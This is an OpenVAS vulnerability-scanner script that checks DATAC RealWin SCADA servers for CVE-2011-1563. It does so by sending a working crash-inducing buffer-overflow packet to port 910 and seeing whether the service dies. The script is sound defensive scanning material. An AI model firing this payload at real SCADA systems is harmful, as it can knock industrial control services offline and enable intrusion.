###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_realwin_scada_on_fc_binfile_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  in the context of the application. Failed exploit attempts will cause a
  denial-of-service condition.
  Impact Level: System/Application";
tag_affected = "DATAC RealFlex RealWin 2.1 (Build 6.1.10.10) and prior.";
tag_insight = "The flaw is due to a boundary error when processing various
  On_FC_BINFILE_FCS_*FILE packets, which can be exploited to cause a stack
  based buffer overflow by sending specially crafted packets to port 910.";
tag_solution = "No solution or patch is available as of 24th June 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://realflex.com/products/realwin/";
tag_summary = "This host is running DATAC RealWin SCADA Server and is prone to
  buffer overflow vulnerability.";

if(description)
{
  script_id(902528);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_bugtraq_id(46937);
  script_cve_id("CVE-2011-1563");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/72826");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43848");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17417/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/realwin_5-adv.txt");

  script_description(desc);
  script_summary("Determine RealWin SCADA Server Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(910);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Default Port
port = 910;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Confirm Application
banner = recv(socket:soc, length:100);
if(banner !~ '^\x10\x23\x54\x67\x00'){
  exit(0);
}

## Building Exploit
head = raw_string(0x10, 0x23, 0x54, 0x67, 0x24, 0x08, 0x00, 0x00,
                  0x01, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xff, 0xff,
                  0x00, 0x00);

junk = crap(data:"a", length:2058);

tail = raw_string(0x00, 0x35, 0x1c, 0x45, 0x54, 0x01, 0x00, 0x00,
                  0x40, 0x00, 0x02, 0x00, 0x00, 0x00);

## Sending Exploit
send(socket:soc, data: head + junk + tail);
close(soc);

## Waiting
sleep(5);

## Confirm Vulnerability
soc = open_sock_tcp(port);
if(!soc){
 security_hole(port);
}
